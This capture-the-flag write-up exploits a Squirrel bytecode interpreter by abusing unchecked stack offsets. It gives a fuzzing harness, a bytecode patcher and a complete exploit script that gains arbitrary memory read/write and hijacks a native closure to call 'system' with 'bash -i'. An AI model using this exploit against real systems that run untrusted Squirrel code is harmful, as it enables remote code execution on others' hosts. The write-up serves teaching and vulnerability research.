# Squirrel as a Service

## Analysis

The challenge consists of a simple service that asks for a squirrel (http://squirrel-lang.org/) program and then executes it.
Full source code for the squirrel interpreter (since it is open source) and the server is provided.
Since this is pwning challenge, the goal is to obtain a shell.

The server program only loads a few basic libraries into the squirrel interpreter. 
In particular, it does not load the `iolib` or `system` squirrel libraries, which would be required to directly execute shell commands:
```
// sq.c, line 188
	sqstd_register_bloblib(v);
	//sqstd_register_iolib(v);
	//sqstd_register_systemlib(v);
	sqstd_register_mathlib(v);
	sqstd_register_stringlib(v);
```
So we will have to exploit some bug in the squirrel interpreter itself to gain shell access.

Let's look at how the squirrel program is loaded by the server. The server (`sq.c`) uses `sqstd_loadfile` to load our program. If we look at the function, we notice an interesting if statement:
```c
// squirrel/sqstdlib/sqstdio.cpp, line 354
if(us == SQ_BYTECODE_STREAM_TAG) { //BYTECODE
    sqstd_fseek(file,0,SQ_SEEK_SET);
    if(SQ_SUCCEEDED(sq_readclosure(v,file_read,file))) {
        sqstd_fclose(file);
        return SQ_OK;
    }
}
else { //SCRIPT
```
So instead of sending a source code program, we can also send the already compiled bytecode.
Since bytecode is usually assumed to be generated and thus correct, there are often less checks on bytecode than on source code.

To understand the bug and the exploitation of the challenge, we need to take a short look at how squirrel byte code is executed at runtime.
The basic model is that of a stack machine: there is a stack, and the bytecode operations push and pop values from that stack.
In contrast to a register-based architecture, all values are stored on the stack (there are no registers).

The implementation of the bytecode interpreter is in `squirrel/sqvm.cpp`. 
Due to a lot of macros, the code can be a little hard to read.
Each opcode (`SQInstruction`) can have up to four arguments (`arg0` to `arg3`).
Arguments are a single byte, except arg1, which is four bytes wide.
All instructions are the same size, so all arguments are always present.
If a specific opcode does not have that many arguments, the additional arguments are simply ignored.

At this point, I wanted to improve my fuzzing skills a little bit so I decided to write a simple
fuzzer for the bytecode.
The bug turned out to be so simple that it would probably have been easier to figure out manually.

For the fuzzer, I wrote a function that turns some instructions into a callable closure.
We can then pass the closure to the squirrel interpreter to call it:

```
// squirrel/sq/sq_fuzz.cpp

// make a closure from bytes
SQClosure* closureFromBytes(HSQUIRRELVM vm, const SQInstruction* bytecode, size_t count) {
    SQFunctionProto *func = SQFunctionProto::Create(
        _ss(vm),
        count + 1, /* ninstructions */
        0, /* nliterals */
        1, /* nparameters */
        0, /* nfunctions */
        0, /* noutervalues */
        0, /* nlineinfos */
        0, /* nlocalvarinfos */
        0 /* ndefaultparms */
    );
    static_assert(sizeof(func->_instructions[0]) == sizeof(*bytecode), "sizeof check");

    memcpy(func->_instructions, bytecode, count * sizeof(SQInstruction));
    func->_instructions[count] = {_OP_RETURN, 255}; // make sure it terminates at the end
    func->_name = SQString::Create(_ss(vm), "fuzz");
    func->_sourcename = SQString::Create(_ss(vm), "fuzz");
    func->_stacksize = 1024;
    func->_varparams = 0;

    return SQClosure::Create(_ss(vm), func, _table(vm->_roottable)->GetWeakRef(OT_TABLE));
}

// the entry point for libFuzzer
extern "C" int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) {
    const size_t instrSize = sizeof(SQInstruction);
    const auto count = Size / instrSize;
    auto vm = sq_open(1024);
    auto closure = closureFromBytes(vm, reinterpret_cast<const SQInstruction*>(Data), count);

    if (getenv("FUZZ_DUMP")) {
        puts("DUMPING");
        vm->Push(closure);
        sqstd_writeclosuretofile(vm, "crash.cnut");
        sq_close(vm);
        exit(0);
    }

    SQRESULT result;
    vm->Push(closure);
    sq_pushroottable(vm);

    result = sq_call(vm, 1, 0, 1);
    sq_pop(vm, 1);
    if (SQ_SUCCEEDED(result)) {
        printf("Done! :) \n");
    }
    else {
        printf("Error! :/\n");
    }

    sq_close(vm);

    return 0;
}
```

To run the fuzzer, we can modify the `squirrel/sq/CMakeLists.txt` file to build our fuzzer:

```cmake
add_executable(sq_fuzz sq_fuzz.cpp)
target_link_libraries(sq_fuzz
  squirrel sqstdlib
  $<$<C_COMPILER_ID:Clang>:-fsanitize=fuzzer,address> # this enables libfuzzer (-fsanitize=fuzzer)
)
target_compile_options(sq_fuzz
  PRIVATE $<$<C_COMPILER_ID:Clang>:-g -O1 -fsanitize=fuzzer,address>
)
```

Then, compile and run it:

```
$ cd squirrel
$ mkdir build_debug && cd build_debug
$ cmake -G Ninja -DCMAKE_EXPORT_COMPILE_COMMANDS=1 --build . --config Debug -DCMAKE_C_COMPILER=clang -DCMAKE_CXX_COMPILER=clang++ -- ..
$ ninja
...
$ ./bin/sq_fuzz
...
=================================================================
==6902==ERROR: AddressSanitizer: SEGV on unknown address 0x6290a34aa2b0 (pc 0x7fa5f10c4b8c bp 0x7ffd9aadfa10 sp 0x7ffd9aadfa10 T0)
==6902==The signal is caused by a READ memory access.
    #0 0x7fa5f10c4b8c  (/code/cscg20/saas/squirrel/build_debug/lib/libsquirrel.so.0+0x4cb8c)
    #1 0x7fa5f10c8835  (/code/cscg20/saas/squirrel/build_debug/lib/libsquirrel.so.0+0x50835)
    #2 0x7fa5f10c47b8  (/code/cscg20/saas/squirrel/build_debug/lib/libsquirrel.so.0+0x4c7b8)
    #3 0x7fa5f1093595  (/code/cscg20/saas/squirrel/build_debug/lib/libsquirrel.so.0+0x1b595)
    #4 0x55e01ddf4fc7  (/code/cscg20/saas/squirrel/build_debug/bin/sq_fuzz+0x14afc7)
    #5 0x55e01dcf415e  (/code/cscg20/saas/squirrel/build_debug/bin/sq_fuzz+0x4a15e)
    #6 0x55e01dcf6390  (/code/cscg20/saas/squirrel/build_debug/bin/sq_fuzz+0x4c390)
    #7 0x55e01dcf6d29  (/code/cscg20/saas/squirrel/build_debug/bin/sq_fuzz+0x4cd29)
    #8 0x55e01dcf90d7  (/code/cscg20/saas/squirrel/build_debug/bin/sq_fuzz+0x4f0d7)
    #9 0x55e01dce2be8  (/code/cscg20/saas/squirrel/build_debug/bin/sq_fuzz+0x38be8)
    #10 0x55e01dcd0313  (/code/cscg20/saas/squirrel/build_debug/bin/sq_fuzz+0x26313)
    #11 0x7fa5f0d44001  (/usr/lib/libc.so.6+0x27001)
    #12 0x55e01dcd036d  (/code/cscg20/saas/squirrel/build_debug/bin/sq_fuzz+0x2636d)
AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV (/code/cscg20/saas/squirrel/build_debug/lib/libsquirrel.so.0+0x4cb8c)
==6902==ABORTING
MS: 5 InsertRepeatedBytes-ChangeBinInt-CrossOver-ChangeBinInt-CrossOver-; base unit: adc83b19e793491b1c6ea0fd8b46cd9f32e592fc
0xa,0x2e,0x24,0xa,0x2e,0x2e,0x0,0x0,
\x0a.$\x0a..\x00\x00
artifact_prefix='./'; Test unit written to ./crash-95e51444b86bade6412349d84e63c239fa2cd9ad
Base64: Ci4kCi4uAAA=
$ env FUZZ_DUMP=1 ./bin/sq_fuzz ./crash-95e51444b86bade6412349d84e63c239fa2cd9ad # dump the crash to a file
$ gdb --args ./bin/sq_fuzz 
(gdb) run
Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7f98b8c in SQVM::IsFalse (o=...) at ../squirrel/sqvm.cpp:669
669	    if(((sq_type(o) & SQOBJECT_CANBEFALSE)
(gdb) bt
#0  0x00007ffff7f98b8c in SQVM::IsFalse (o=...) at ../squirrel/sqvm.cpp:669
#1  0x00007ffff7f9c836 in SQVM::Execute (this=0x555555573820, closure=..., nargs=1, stackbase=2, outres=..., raiseerror=1, et=SQVM::ET_CALL) at ../squirrel/sqvm.cpp:994
#2  0x00007ffff7f987b9 in SQVM::Call (this=0x555555573820, closure=..., nparams=1, stackbase=2, outres=..., raiseerror=1) at ../squirrel/sqvm.cpp:1587
#3  0x00007ffff7f67596 in sq_call (v=0x555555573820, params=1, retval=0, raiseerror=1) at ../squirrel/sqapi.cpp:1178
#4  0x0000555555555773 in executeVm (v=0x555555573820, retval=0x7fffffffe198, filename=0x7fffffffe69e "./crash.cnut") at ../sq/sq.c:94
#5  0x0000555555555a33 in main (argc=2, argv=0x7fffffffe328) at ../sq/sq.c:205
(gdb) f 1
#1  0x00007ffff7f9c836 in SQVM::Execute (this=0x555555573820, closure=..., nargs=1, stackbase=2, outres=..., raiseerror=1, et=SQVM::ET_CALL) at ../squirrel/sqvm.cpp:994
994	            case _OP_NOT: TARGET = IsFalse(STK(arg1)); continue;
(gdb) print _i_
$1 = (const SQInstruction &) @0x55555557a390: {_arg1 = 170143242, op = 46 '.', _arg0 = 46 '.', _arg2 = 0 '\000', _arg3 = 0 '\000'}
```

Looking at that crash, it seems to try to access the element `170143242` on the stack, which of course fails since our stack is nowhere near that big.
We realize that almost none of the opcodes actually check if the stack offsets given in the arguments are valid.
For easier exploitation, I wanted to be able to write to *negative* offset from the current stack base.
Usually the only opcode argument that can be negative if `arg1` since all other arguments are unsigned bytes.
That argument is only used for read offsets though.

But there are a few exceptions. Sometimes, the other arguments are also interpreted as signed bytes.
We can find those places by looking for usages of `sarg[023]`.
I decided to use the usage in the `_OP_CALL` opcode for the exploit:

```
case _OP_CALL: {
        SQObjectPtr clo = STK(arg1);
        switch (sq_type(clo)) {
        case OT_CLOSURE:
            _GUARD(StartCall(_closure(clo), sarg0, arg3, _stackbase+arg2, false));
            continue;
// bool SQVM::StartCall(SQClosure *closure,SQInteger target,SQInteger args,SQInteger stackbase,bool tailcall)
```
The argument here is used as the `target` for the `StartCall` function function.

The `target` argument specifies the stack offset for the return value of the function.
When the function that was called by the `_OP_CALL` instruction returns, the returned value is stored there.
This can be used to write arbitrary return values to negative offsets on the stack.

## The exploit compiler

We don't want to write our whole exploit in raw bytecode.
Therefore, a way to inject the "invalid" bytecode into an existing squirrel program is needed.
I decided to reuse the squirrel compiler for this, and apply some patches to the bytecode after compiling it.

The method works as follows: whenever we find a call to a function called `setMinusN` (where N is an arbitrary number), the call is patched so that the return arg for that call is set to `-N`.
Here's how to accomplish that with some C++ code:

```
// this basically just compiles `exploit.nut` without calling it
auto vm = sq_open(1024);
sq_setprintfunc(vm, printfunc, errorfunc);

sq_pushroottable(vm);
sqstd_register_bloblib(vm);
sqstd_register_mathlib(vm);
sqstd_register_stringlib(vm);

CHECK(vm, sqstd_loadfile(vm, "./exploit.nut", SQTrue));
auto exploitFunc = _closure(vm->Top())->_function;
debug("stack %lld", exploitFunc->_stacksize);

// patch CALL instructions for special features
for (int pidx = 0; pidx < exploitFunc->_ninstructions; ++pidx) {
    // before a call, there is a PREPCALLK opcode that loads the function
    // we require it to find the function name
    SQInstruction& prepcall = exploitFunc->_instructions[pidx];
    if (prepcall.op != _OP_PREPCALLK) continue;
    const char* name = _string(exploitFunc->_literals[prepcall._arg1])->_val;

    // if we have found a PREPCALLK, search for the actual CALL instruction that uses that function
    SQInstruction* call = NULL;
    for (int cidx = pidx; cidx < exploitFunc->_ninstructions; ++cidx) {
        SQInstruction* c = exploitFunc->_instructions + cidx;
        if (c->op == _OP_CALL && c->_arg1 == prepcall._arg0) {
            call = c;
            break;
        }
    }

    // if the function matches our naming scheme, patch the call
    if (strncmp(name, "setMinus", strlen("setMinus")) == 0) {
        int idx = -atoi(name + strlen("setMinus"));

        call->_arg0 = idx;
        debug("patched call to %s", name);
    }
}
```

Also, we want some control over stack size.
Functions in Squirrel specify how much bytes of stack they require when they are called.
So we include another patch: functions with the name `stackN` are patched to require a stack size of `N` bytes.
This way, when we call that function, the stack must be at least that amount of bytes.
After patching, we can simply write our compiled bytecode back to file using `sqstd_writeclosuretofile`.
Here's that part:
```
// patch function stack size
for (int fidx = 0; fidx < exploitFunc->_nfunctions; ++fidx) {
    auto func = _funcproto(exploitFunc->_functions[fidx]);
    if (sq_type(func->_name) != OT_STRING) continue;

    const char* name = _string(func->_name)->_val;
    if (strncmp(name, "stack", strlen("stack")) == 0) {
        int size = atoi(name + strlen("stack"));
        func->_stacksize = size;
        debug("adjusted stack size of %s", name);
    }
}

sqstd_writeclosuretofile(vm, "exploit.cnut");
```

## Debugging the exploit

During development of the exploit, we would like to have breakpoints at points in our exploit script.
There's another nice squirrel feature we can use for that: a debug hook.
This hook is called for each line and function call, allowing us to easily break at arbitrary points in a debugger:

```
void debugfunc(HSQUIRRELVM vm, SQInteger type, const SQChar* source, SQInteger line, const SQChar* funcname) {
    //debug("debug hook: %lld %s %lld %s", type, source, line, funcname);
    // we support a magic function with name "debugtrap". Whenever that's called, a int3 (breakpoint) is triggered.
    if (funcname && !strcmp(funcname, "debugtrap") && debug || debug && line == 42) {
        asm("int $0x03");
    }
}
```

In the main method, we call our patched bytecode after registering the debug hook:

```
sq_setprintfunc(vm, printfunc, errorfunc);
sqstd_seterrorhandlers(vm);
sq_setnativedebughook(vm, debugfunc); // register the debug hook

HSQOBJECT obj;
sq_getstackobj(vm, -1, &obj);
sq_addref(vm, &obj);
sq_pop(vm, 1);

sq_pushobject(vm, obj);
sq_pushroottable(vm);
executing = true;
CHECK(vm, sq_call(vm, 1, 0, 1));
```

## Exploit

Now it's time for the actual exploit.
The basic idea is quite simple: first, we allocate a lot of blob objects.
In the beginning, these blobs might be allocated from anywhere with the heap,
as there may be already some free places of the right size.

However, eventually, all existing free space on the heap is filled up.
The remaining blob objects are then allocated at the end of the heap.
After doing that, we expand the stack, forcing it to be reallocated as well.
Since we've already filled up all free space with blobs before,
the stack will also be allocated from the end of the heap, directly after the blob objects.
So without knowning the exact layout of the heap before this, what we will end up with is this:

```
HEAP
some data
BLOB OBJECT (a few blob objects scattered through the heap, filling the free "holes")
some other data
...
some more data
BLOB OBJECT // end of the heap: only BLOB OBJECTS + their data buffers
BLOB data
BLOB OBJECT
BLOB data
BLOB OBJECT
BLOB data
BLOB OBJECT
BLOB data
BLOB OBJECT
BLOB data
BLOB OBJECT
BLOB data
BLOB OBJECT
BLOB data
BLOB OBJECT
BLOB data
BLOB OBJECT
BLOB data
NEW STACK
```

We then use our negative offset write to corrupt the blob object.
This will provide us with a nicer primitive, since blob objects allow direct writing of integer values.
Unfortunately, we cannot corrupt the size directly, since we can only write `SQObjectPtr` values, which have a size of 16 byte (this is because the squirrel stack is a `sqvector<SQObjectPtr>`)-
An `SQObjectPtr` consist of a type tag and the actual value.

A blob object has the following fields:
```
private:
    SQInteger _size;
    SQInteger _allocated;
    SQInteger _ptr;
    unsigned char *_buf;
    bool _owns;
```
If we try to overwrite `_size`, the type tag will be written before it, corrupting the vtable of the blob object.
Instead, we will overwrite `_ptr` (the current read/write position of the blob).
The type tag will then overwrite `_allocated`, but since the tag for integers is huge (0x5000002) this makes sure that the capacity of the buffer will always be enough for whatever we want to do.

After that, we can now read/write at arbitrary offsets by settings `_ptr`. We first use that to leak the vtable (so we get the location of the text segment for the squirrel lib), and then build some more primitives
to get full arbitrary read write.

To obtain a shell, we leak the address of a closure and overwrite its pointer with the pointer of the `system` function inside the squirrel lib. Here's the full exploit:

```
local OT_INTEGER = 0x5000002;
local OT_NATIVECLOSURE = 0x8000200;

# declare some functions for the compiler (these are replaced by the patcher)
# function stack2048();
function debugtrap(...) {}

# setMinus8 will write whatever we give it as argument to offset -8 in the stack
# (calls to this function are modified by the patcher)
function setMinus8(x) {
  return x;
}

# make blob allocations after stack
local blobs = array(1000)
for(local i = 0; i < blobs.len(); ++i) {
  blobs[i] = blob(0x20);
}
local buffer = blob(0x20);
local victim = blob(0x20)

# increase stack 
# after this, the stack should be located right after the last blob
stack2048()

# grow the blob buffer by overwritting capacity
# this sets the blob's _capacity to OT_INTEGER and _ptr to 0x1000
setMinus8(1000);
victim.writen(0, 'c')
printf("size %d\n", victim.len())

# set the _ptr to -0x40, where we find a vtable (of the blob object)
setMinus8(-0x40)
debugtrap(victim)
local vtable = victim.readn('l')
printf("vtable %#x\n", vtable)

# build a better primitive:
# we will scan backward to find the second-last allocated blob
# we can identify it by checking for the vtable ptr
local idx = -0x40
while (true) {
      idx -= 0x8;
      setMinus8(idx);
      if (victim.readn('l') == vtable) {
      break
      }
}
printf("found buffer blob at offset -%#x\n", -idx)

# now we can directly change the size of the 2nd-last blob (buffer) using the corrupt blob (victim)
victim.writen( 0x1337, 'l')
printf("buffer size %x\n", buffer.len())

# since buffer is at a lower heap address than victim, 
# the victim blob object is inside the data of buffer 
#
# we can control the victim more easily using buffer
# find the victim inside the buffer block
while (true) {
      if (buffer.readn('l') == vtable) break;
}
local victimIdx = buffer.tell();
buffer.seek(victimIdx + 0x18)
local victimBuf = buffer.readn('l')
printf("found victim: offset %#x, buf %#x\n ", victimIdx, victimBuf);

# set the address that victim will read from / write to
function setaddr(addr) {
  buffer.seek(victimIdx);
  buffer.writen(0x1000, 'l'); # size
  buffer.writen(0x1000, 'l'); # allocated
  buffer.writen(0, 'l'); # ptr
  buffer.writen(addr, 'l'); # buf
}

# read a long from the absolute addr
function read(addr) {
  setaddr(addr);
  return victim.readn('l');
}

# read a character from the absolute addr
function readc(addr) {
  setaddr(addr);
  return victim.readn('c');
}

# write a long to the absolute addr
function write(addr, v) {
  setaddr(addr);
  return victim.writen(v, 'l');
}

# find the address of a string starting at addr
# the argument is the uppercase version of the string to find
# this avoids finding the literal itself
function findChars(addr, str) {
  while (true) {
    local found = true;
    foreach (i,c in str) {
      if (readc(addr + i) != (c ^ 0x20)) {
        found = false;
        break;
      };
    }
    if (found) break;

    addr++;
  }
  return addr;
}

# find a 8-byte aligned word starting from the given addr
function findAlignedQWord(addr, v) {
  while (read(addr) != v) {
    addr += 8;
  }
  return addr;
}

# find an object with the given type
function findObject(addr, type) {
  return findAlignedQWord(addr, type)
}

# find an integer with the given value
function findIntegerObj(addr, val) {
  while (read(addr) != OT_INTEGER || read(addr + 8) != val) {
    addr += 8;
  }
  return addr;
}


# first, locate the address of "marker" (marker will be put on the stack)
# since the stack is located after our blobs, we can start searching from the "victimBuf" address
local marker = 0x13371337;
local stackAddr = findIntegerObj(victimBuf, marker);
printf("found stack at %#x\n", stackAddr);

# we will putna NativeClosure on the stack (escape)
# we can then replace the function pointer of the NativeClosure with system
local escape_func = escape;
local escape_nc = read(findObject(stackAddr, OT_NATIVECLOSURE) + 8);

# the function pointer is located at offset + 0x68
# this leaks the location of the sqstdlib shared object in memory
local escape_faddr = read(escape_nc + 0x68)
printf("escape nativeclosure %#x func %#x\n", escape_nc, escape_faddr);

# search for SYSTEM func (note: all caps to not cause false references)
# sqstdlib also contains the sqstdsystem lib, which will have an object associating SYSTEM with the _SYSTEM func
# we first find that string, and then find the reference to it
local SYSTEM_STR = findChars(escape_faddr, "SYSTEM")
printf("SYSTEM str: %#x\n", SYSTEM_STR);

local strRef = findAlignedQWord(vtable & ~0xfff, SYSTEM_STR);
printf("str ref at: %#x\n", strRef);
local SYSTEM_ADDR = read(strRef + 8)
printf("SYSTEM at: %#x\n", SYSTEM_ADDR);

// replace escapeFunc ref
write(escape_nc + 0x68, SYSTEM_ADDR)

// call it
escape_func("bash -i 2>&1")


debugtrap(escape_func)

```

## Mitigation
Fix the bug: verify that the offsets given in the bytecode instructions are inside the stack bounds.
Also, clean up the code so it is easier to follow.

And if you're running untrusted squirrel code, you should probably only do so in a sandbox. Squirrel itself
cannot be considered a secure VM.
